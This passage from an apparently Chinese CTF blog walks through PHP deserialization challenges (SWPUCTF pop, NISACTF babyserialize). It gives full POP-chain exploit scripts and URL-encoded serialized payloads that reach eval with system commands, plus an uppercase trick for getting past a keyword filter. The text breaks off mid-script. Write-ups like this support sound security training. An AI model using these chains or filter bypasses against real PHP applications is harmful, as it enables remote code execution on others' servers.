<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=useless.php&amp;text=data://text/plain,welcome%20to%20the%20zjctf&amp;password=O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>flag</code>在注释中</p>

        <h1 id="SWPUCTF-2021-新生赛-pop"   >
          <a href="#SWPUCTF-2021-新生赛-pop" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107174901023.png" alt="image-20230107174901023"></p>
<p>访问之后，可以看到考<code>pop</code>链，这里即为</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">w22m-&gt;__destruct()&#123;<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;&#125;</span><br><span class="line"><span class="comment">//设置成员$this-&gt;w00m为w33m类,进而调用到w33m-&gt;__toString</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w33m-&gt;__toString()&#123;<span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();&#125;</span><br><span class="line"><span class="comment">//设置成员$this-&gt;w00m为w44m类,$this-&gt;w22m为&quot;Getflag&quot;</span></span><br><span class="line"><span class="comment">//进而调用到w44m-&gt;Getflag()函数</span></span><br></pre></td></tr></table></div></figure>

<p>得到如下<code>exp</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;aaaaa&#125;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w3Obj</span> = <span class="keyword">new</span> w33m();</span><br><span class="line"><span class="variable">$w2Obj</span> = <span class="keyword">new</span> w22m();</span><br><span class="line"><span class="variable">$w4Obj</span> = <span class="keyword">new</span> w44m();</span><br><span class="line"></span><br><span class="line"><span class="variable">$w2Obj</span>-&gt;w00m = <span class="variable">$w3Obj</span>;</span><br><span class="line"><span class="variable">$w3Obj</span>-&gt;w00m = <span class="variable">$w4Obj</span>;</span><br><span class="line"><span class="variable">$w3Obj</span>-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$w2Obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;w44madmin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;*passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>之后由于<code>W44m</code>中<code>private</code>和<code>protected</code>的关系，打印不出来<code>\x00</code>这样的字符，所以我们需要按照规则使用<code>%00</code>进行补充</p>
<ul>
<li><p><code>private</code></p>
<p>变为<code>\x00className\x00memberName</code></p>
</li>
<li><p><code>public</code></p>
<p>仍然为原始的</p>
</li>
<li><p><code>protected</code></p>
<p>变为<code>\x00*\x00memberName</code></p>
</li>
</ul>
<p>最终得到<code>EXP</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>得到<code>flag</code></p>

        <h1 id="NISACTF-2022-babyserialize"   >
          <a href="#NISACTF-2022-babyserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1>
      <p>依据相关代码，主要是在<code>NISA.__invoke</code>中有如下代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108113757842.png" alt="image-20230108113757842"></p>
<p>那么只要调用到<code>NISA.__invoke</code>函数，并且控制<code>NISA.txw4ever</code>成员即可做到任意函数调用。</p>
<p>首先给出总的函数调用链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TianXiWei.__wakeup-&gt;Ilovetxw.__call-&gt;four.__set-&gt;Ilovetxw.__toString-&gt;NISA.__invoke-&gt;@eval($this-&gt;txw4ever);</span><br></pre></td></tr></table></div></figure>

<p>接下来具体分析一下</p>
<ul>
<li><p><code>Ilovetxw.__toString-&gt;NISA.__invoke</code></p>
<p><code>Ilovetxw.__toString</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108114004672.png" alt="image-20230108114004672"></p>
<p><code>__invoke</code>性质：当尝试以调用函数的方式调用对象的时候，就会调用该方法</p>
<p>那么通过设置<code>Ilovetxw.su</code>为某个<code>NISA</code>对应对象，即可调用到<code>NISA.__invoke</code></p>
</li>
<li><p><code>four.__set-&gt;Ilovetxw.__toString</code></p>
<p><code>four.__set</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120158522.png" alt="image-20230108120158522"></p>
<p>这里可以看到调用了<code>strtolower($this-&gt;a)</code>，查一下手册</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strtolower.php" >PHP: strtolower - Manual</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120354823.png" alt="image-20230108120354823"></p>
<p>可以看到会将传入变量转化为<code>String</code>，也就是说如果传入一个对象，那么就会调用该对象的<code>__toString</code>方法来将它转化为<code>String</code>。那么这里就将<code>four.a</code>设置为<code>Ilovetxw</code>对应对象，即可调用到<code>Ilovetxw.__toString</code></p>
</li>
<li><p><code>Ilovetxw.__call-&gt;four.__set</code></p>
<p><code>Ilovetxw.__call</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120814927.png" alt="image-20230108120814927"></p>
<p><code>__set</code>的相关性质：在给不可访问的<code>protected</code>或者<code>private</code>或者不存在的属性赋值的时候，会被调用</p>
<p>这里就可以设置<code>Ilovetxw-&gt;huang</code>为<code>four</code>的对象，而<code>four</code>中没有<code>fun</code>成员属性，所以就会调用到<code>four-&gt;__set</code>。</p>
</li>
<li><p><code>TianXiWei.__wakeup-&gt;Ilovetxw.__call</code></p>
<p><code>TianXiWei.__wakeup</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121124426.png" alt="image-20230108121124426"></p>
<p><code>__call</code>相关性质：在对象中调用一个不可访问的方法的时候，会被执行</p>
<p>那么可以设置<code>TianXiwei-&gt;ext</code>为<code>Ilovetxw</code>对象，而<code>Ilovetxw</code>没有<code>nisa</code>方法，就会调用到<code>Ilovetxw-&gt;__call</code>方法。</p>
</li>
<li><p><code>TianXiWei.__wakeup</code></p>
<p>对于<code>__wakeup</code>的性质不用多说，在反序列化的时候就会自动调用了。</p>
</li>
</ul>
<p>相关总结如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@eval($this-&gt;txw4ever);</span><br><span class="line">//设置NISA.txw4ever即可执行命令</span><br><span class="line"></span><br><span class="line">NISA.__invoke</span><br><span class="line">//通过Ilovetxw.__toString调用,需要设置IlovetxwObj.su为class NISA</span><br><span class="line">__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</span><br><span class="line"></span><br><span class="line">Ilovetxw.__toString</span><br><span class="line">//通过four.__set调用strtolower,从而调用到__toString。需要设置fourObj.a为class IlovetxwObj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">four.__set</span><br><span class="line">//通过Ilovetxw.__call调用,需要设置IlovetxwObj.huang为class four</span><br><span class="line">__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line"></span><br><span class="line">Ilovetxw.__call</span><br><span class="line">//通过TianXiWei.__wakeup调用，需要设置ext为class Ilovetxw</span><br><span class="line">__call():在对象中调用一个不可访问的方法的时候，会被执行</span><br><span class="line"></span><br><span class="line">TianXiWei.__wakeup</span><br><span class="line"></span><br><span class="line">unserialize(TianXiWei)调用TianXiWei.__wakeup</span><br></pre></td></tr></table></div></figure>

<p>那么最终的<code>EXP</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">//hint();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//checkcheck($this-&gt;txw4ever);</span></span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="keyword">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            strtolower(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span> = <span class="keyword">new</span> TianXiWei();</span><br><span class="line"><span class="variable">$IlovetxwObj</span> = <span class="keyword">new</span> Ilovetxw();</span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span>-&gt;ext = <span class="variable">$IlovetxwObj</span>;  <span class="comment">//$this-&gt;ext-&gt;nisa($this-&gt;x);调用到Ilovetxw-&gt;__call();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span> = <span class="keyword">new</span> four();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;huang = <span class="variable">$fourObj</span>; <span class="comment">//$this-&gt;huang-&gt;fun=$arg[0];调用到four-&gt;__set();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span>-&gt;a = <span class="variable">$IlovetxwObj</span>;<span class="comment">//strtolower($this-&gt;a);调用到$IlovetxwObj.__toString();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span> = <span class="keyword">new</span> NISA();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;su = <span class="variable">$NISAObj</span>;<span class="comment">// $bb = $this-&gt;su;return $bb();调用到NISA.__invoke();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /fllllllaaag&#x27;);&quot;</span>;<span class="comment">//@eval($this-&gt;txw4ever);调用到system(&quot;ipconfig&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myString</span> = serialize(<span class="variable">$TianXiWeiObj</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$myString</span>);</span><br><span class="line"><span class="comment">//unserialize($myString); //调用TianXiWei.__invoke();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>首先可以看看<code>hint</code>中有啥，要将<code>NISA-&gt;fun</code>设置为<code>&quot;show_me_flag&quot;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121600420.png" alt="image-20230108121600420"></p>
<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121739396.png" alt="image-20230108121739396"></p>
<p>然后改掉<code>NISA-&gt;fun</code>，因为<code>hint</code>函数中有<code>die</code>函数调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121804523.png" alt="image-20230108121804523"></p>
<p>看看根目录有啥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>

<p>发现有错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121855956.png" alt="image-20230108121855956"></p>
<p>应该是<code>checkcheck</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121939989.png" alt="image-20230108121939989"></p>
<p>可能是<code>preg_match</code>进行了一些过滤，这里把<code>system</code>变成大写就行，查看根目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22System%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108122127917.png" alt="image-20230108122127917"></p>
<p>然后<code>cat /fllllllaaag </code>即可，最终<code>exp</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">//hint();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span 